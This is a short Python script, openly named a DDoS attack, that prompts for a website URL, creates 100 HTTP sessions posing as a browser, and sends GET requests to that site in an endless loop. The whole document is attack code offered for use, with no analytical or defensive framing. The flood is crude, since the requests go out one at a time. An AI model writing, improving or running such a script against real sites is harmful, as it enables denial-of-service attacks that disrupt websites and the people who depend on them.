import requests
import time

target_website = input("Enter website URL: ")

def create_bots():
    bots = []
    for i in range(100):
        bot = requests.Session()
        bot.headers.update({"User-Agent": "Mozilla/5.0"})
        bots.append(bot)
    return bots

def ddos_attack():
    bots = create_bots()
    while True:
        start_time = time.time()
        for bot in bots:
            try:
                response = bot.get(target_website)
                print(f"Bot attacked. Response status code: {response.status_code}")
            except:
                print("Error during bot attack")
        end_time = time.time()
        elapsed_time = end_time - start_time
        if elapsed_time < 1:
            time.sleep(1 - elapsed_time)

ddos_attack()
